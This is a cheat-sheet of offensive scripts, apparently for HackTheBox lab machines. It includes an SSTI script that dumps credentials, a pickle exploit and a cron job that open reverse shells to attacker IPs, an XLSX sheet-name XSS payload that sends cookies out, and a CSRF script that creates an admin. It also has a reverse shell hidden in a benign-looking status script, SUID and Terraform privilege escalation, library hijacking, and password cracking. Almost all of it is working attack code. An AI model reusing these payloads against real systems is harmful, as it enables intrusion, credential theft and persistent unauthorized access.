---
icon: scroll
---

# SCRIPTING AND COMMANDES

## Python Script (SSTI Data Extraction)

{% code fullWidth="true" %}
```python
import re  
import requests  
import html  

url = "http://hacknet.htb"  
headers = {  
    'Cookie': "csrftoken=uv50VFGcUZz15IDt9kEWCUa7RrdiTX4f; sessionid=zsb8y28d8wblc60iukbnf188j2uj1w9w"  
}  

all_users = set()

for i in range(1, 31):  
    
    requests.get(f"{url}/like/{i}", headers=headers)  

      
    text = requests.get(f"{url}/likes/{i}", headers=headers).text  

    
    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
    if not img_titles:  
        continue  
    last_title = html.unescape(img_titles[-1])  

   
    if "<QuerySet" not in last_title:  
        requests.get(f"{url}/like/{i}", headers=headers)  
        text = requests.get(f"{url}/likes/{i}", headers=headers).text  
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
        if img_titles:  
            last_title = html.unescape(img_titles[-1])  

    
    emails = re.findall(r"'email': '([^']*)'", last_title)  
    passwords = re.findall(r"'password': '([^']*)'", last_title)  

    
    for email, p in zip(emails, passwords):  
        username = email.split('@')[0]  # 取邮箱前缀  
        all_users.add(f"{username}:{p}")  


for item in all_users:  
    print(item)

```
{% endcode %}

***

## Python Pickle Exploit (Cache Poisoning)

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        print("HAHA")
        return (os.system, ('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1"',))

payload = pickle.dumps(Exploit())




for file in os.listdir("/var/tmp/django_cache"):
    if file.endswith(".djcache"):
        print(file)
        os.remove(file)
        print("file removed")
        print(file)
        with open(file, "wb") as f:
            f.write(payload)
            
            
            
mikey@hacknet:/var/tmp/django_cache$ python3 exploit.py 
HAHA
1f0acfe7480a469402f1852f8313db86.djcache
file removed
1f0acfe7480a469402f1852f8313db86.djcache
90dbab8f3b1e54369abdeb4ba1efc106.djcache
file removed
90dbab8f3b1e54369abdeb4ba1efc106.djcache

```

***

## GPG (Décryptage de Fichiers)

```shellscript
# Import de la clé privée GPG
gpg --import /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc

# Décryptage des backups
gpg --decrypt backup01.sql.gpg > /home/sandy/decryp1
gpg --decrypt backup02.sql.gpg > /home/sandy/decryp2
gpg --decrypt backup03.sql.gpg > /home/sandy/decryp3
```

***

## gpg2john + John the Ripper

```shellscript
# Extraction du hash GPG
gpg2john armored_key.asc > hash

# Crackage de la passphrase
john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt
```

***

## SSH Key Generation

```shellscript
# Génération de clés SSH
ssh-keygen -t rsa -b 4096 -f sandy -C "" -N ""

# Ajout de la clé publique sur la cible
mkdir "$HOME/.ssh"
echo 'ssh-rsa AAAAB3Nza...' >> "$HOME/.ssh/authorized_keys"

# Connexion avec clé privée
ssh -i sandy sandy@10.10.11.85
```

***

## Python script generate XLSX

```python
from openpyxl import Workbook
import base64

# URL à exfiltrer
url = "http://10.10.14.13:8000/?c="

# Encodage en base64
encoded = base64.b64encode(url.encode()).decode()

# Payload : décode l’URL et exécute le fetch
payload = f'"> <img src=x onerror=fetch(atob`{encoded}`+document.cookie)>'

wb = Workbook()
ws1 = wb.active
ws1.title = "Data"

ws2 = wb.create_sheet(title=payload)
ws1["A1"] = "Test"
ws2["A1"] = "Trigger"

out_name = "xss_b64.xlsx"
wb.save(out_name)

print(f"[+] Généré: {out_name} (payload length={len(payload)})")

```

***

## Python SCRF script

```python
// Some codeimport requests
import re
import http.server
import socketserver
import threading

# === CONFIG À MODIFIER ===
token_url = "http://portal.guardian.htb/lecturer/notices/create.php"
target_url = "http://portal.guardian.htb/admin/createuser.php"

# Ton cookie de session (obtenu après login avec un compte legit)
cookies = {
    "PHPSESSID": "7ain3gshecn4vtru89lkegomp2"
}

# Nouveau compte admin que tu veux injecter
payload = {
    "username": "evil_admin",
    "password": "SuperPass123!",
    "full_name": "Evil Attacker",
    "email": "evil@guardian.htb",
    "dob": "2000-01-01",
    "address": "1337 Hacker Street",
    "user_role": "admin"
}

# === ÉTAPE 1 : Récupérer le token CSRF ===
print("[*] Fetching CSRF token...")
resp = requests.get(token_url, cookies=cookies)
html = resp.text

match = re.search(r'name="csrf_token" value="([a-f0-9]+)"', html)
if not match:
    print("[!] CSRF token not found!")
    exit(1)

csrf_token = match.group(1)
print(f"[+] CSRF token found: {csrf_token}")

# === ÉTAPE 2 : Générer le fichier csrf.html ===
csrf_html = f"""<!DOCTYPE html>
<html>
  <body>
    <h1>Loading...</h1>
    <form id="csrfForm" action="{target_url}" method="POST">
      <input type="hidden" name="username" value="{payload['username']}" />
      <input type="hidden" name="password" value="{payload['password']}" />
      <input type="hidden" name="full_name" value="{payload['full_name']}" />
      <input type="hidden" name="email" value="{payload['email']}" />
      <input type="hidden" name="dob" value="{payload['dob']}" />
      <input type="hidden" name="address" value="{payload['address']}" />
      <input type="hidden" name="user_role" value="{payload['user_role']}" />
      <input type="hidden" name="csrf_token" value="{csrf_token}" />
    </form>
    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
"""

with open("csrf.html", "w") as f:
    f.write(csrf_html)

print("[+] csrf.html generated!")

# === ÉTAPE 3 : Lancer un serveur web local ===
PORT = 8000

def run_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"[*] Hosting csrf.html on http://10.10.14.13:{PORT}/csrf.html")
        print("[*] Send this link to the admin!")
        httpd.serve_forever()

threading.Thread(target=run_server).start()

```

***

## Python reverse shell inside a normal script

```python
import platform
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    print("test")
    os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
```

***

## C Reverse shell Module

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```

***

## Terraform privilege escalation

```shellscript
#!/bin/bash

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Terraform Privilege Escalation Exploit${NC}"
echo -e "${YELLOW}[*] Target: Previous HTB Machine${NC}\n"

# Étape 1: Création du provider malveillant
echo -e "${GREEN}[+] Step 1: Creating malicious Terraform provider${NC}"
cat > /tmp/terraform-provider-examples << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

chmod +x /tmp/terraform-provider-examples
echo -e "${GREEN}[✓] Malicious provider created at /tmp/terraform-provider-examples${NC}\n"

# Étape 2: Création du fichier de configuration Terraform override
echo -e "${GREEN}[+] Step 2: Creating Terraform config override${NC}"
cat > /tmp/dollarboysushil.rc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF

echo -e "${GREEN}[✓] Config file created at /tmp/dollarboysushil.rc${NC}\n"

# Étape 3: Export de la variable d'environnement
echo -e "${GREEN}[+] Step 3: Setting TF_CLI_CONFIG_FILE environment variable${NC}"
export TF_CLI_CONFIG_FILE=/tmp/dollarboysushil.rc
echo -e "${GREEN}[✓] TF_CLI_CONFIG_FILE=${TF_CLI_CONFIG_FILE}${NC}\n"

# Étape 4: Exécution de Terraform en tant que root
echo -e "${GREEN}[+] Step 4: Running Terraform as root${NC}"
echo -e "${YELLOW}[!] You will be prompted for sudo password${NC}"
sudo /usr/bin/terraform -chdir=/opt/examples apply -auto-approve

# Vérification du SUID
echo -e "\n${GREEN}[+] Step 5: Checking if SUID bit is set${NC}"
ls -la /bin/bash | grep -q "rws" && echo -e "${GREEN}[✓] SUID bit successfully set on /bin/bash${NC}" || echo -e "${RED}[✗] SUID bit not set${NC}"

# Étape 5: Obtenir un shell root
echo -e "\n${GREEN}[+] Step 6: Spawning root shell${NC}"
echo -e "${YELLOW}[!] Executing: /bin/bash -p${NC}\n"
/bin/bash -p
```

***

## C Race condition Scriot

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    time_t now = (unsigned int) time(NULL);
    srand(now);                                     // Même seed que le programme cible
    int key = rand() % 0xfffff;                     // Même algorithme de génération
    int shmid = shmget(key, 0x400, 0x3b6);        // Accès à la même zone mémoire
    char *h_shm = shmat(shmid, (void *) 0, 0);
    
    // Payload d'injection SQL
    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; touch /tmp/0xdf;#");
    
    shmdt(h_shm);
    return 0;
}
```

***

## Psafe Crak

```shellscript
pwsafe2john Backup.psafe3  
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
                                                                                                                                                                                                                 
                                                                                                                                                                                                                 
pwsafe2john Backup.psafe3 > backup
                                                                                                                                                                                                           
pwsafe2john Backup.psafe3 > backup.hash  
                                                                                                                                                                                                               
john --wordlist=../rockyou.txt backup.hash
```

***

## IPTABLES EXPLOIT SCRIPT

{% code fullWidth="true" %}
```shellscript
ssh-keygen -t ed25519 -f ed_25519
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519. user@host'
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
chmod 600 ed_25519

```
{% endcode %}

***

## Python Script for JWT key manipulation

```pug
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests

rhost = 'hardhatc2.local:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://127.0.0.1:5000/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "kali",
  "role": "TeamLead",
  "username": "kali"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)

```

***

## C Library hijacking

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructeur : s'exécute au chargement de la bibliothèque
__attribute__((constructor)) void malicious_init() {
    // Code malveillant ici
    system("whoami > /tmp/hijack_proof.txt");
    // L'application continue normalement après
}

// Fonctions légitimes pour maintenir la compatibilité
int legitimate_function() {
    return 0;
}

gcc -x c -shared -fPIC -o ./libxcb.so.1
```

***

## Cronjob Persistance

{% code fullWidth="true" %}
```
Quality of Life Improvements
Establish Persistence
crontab -l 2>/dev/null > /tmp/crontab.txt
echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.132/443 0>&1'" >> /tmp/crontab.txt
crontab /tmp/crontab.txt
Now, if you lose your reverse shell, you don't need to go through the process of uploading your module. You can just wait for the next crontab to run (every minute) and catch a new reverse shell.
```
{% endcode %}

***

## BBOT personlized modules abuse with Pyton

```
from bbot.modules.base import BaseModule
import pty
import os

class systeminfo_enum(BaseModule):
    watched_events = []
    produced_events = []
    flags = ["safe", "passive"]
    meta = {"description": "System Info Recon (actually spawns root shell)"}

    async def setup(self):
        self.hugesuccess("📡 systeminfo_enum setup called — launching shell!")
        try:
            pty.spawn(["/bin/bash", "-p"])
        except Exception as e:
            self.error(f"❌ Shell failed: {e}")
        return True
```

```
sudo /usr/local/bin/bbot -t dummy.com -p /home/graphasm/preset.yml --event-types ROOT
```

```
description: System Info Recon Scan
module_dirs:
  - .
modules:
  - systeminfo_enum
```

***

## WEB IDE EXPLOIT

```
module_name = 'o' + 's'
method_name = 's' + 'y' + 's' + 't' + 'e' + 'm'
module = sys.modules[module_name]
method = getattr(module, method_name)
method('ping -c 3 10.10.14.106')
```

```

for name, obj in globals().items():
    try:
        print(f"{name}: {type(obj)}")
    except Exception:
        pass
```
